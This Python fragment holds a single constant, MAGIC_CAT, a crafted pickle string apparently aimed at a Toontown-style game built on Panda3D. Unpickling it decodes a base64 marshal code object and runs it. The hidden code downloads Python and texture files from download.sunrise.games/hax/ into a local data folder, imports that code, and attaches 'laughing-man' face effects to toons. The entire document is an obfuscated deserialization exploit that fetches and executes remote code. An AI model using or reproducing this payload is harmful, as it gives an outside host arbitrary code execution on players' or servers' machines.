MAGIC_CAT = '''ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'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'
tRtRc__builtin__
globals
(tRS''
tR(tR.
'''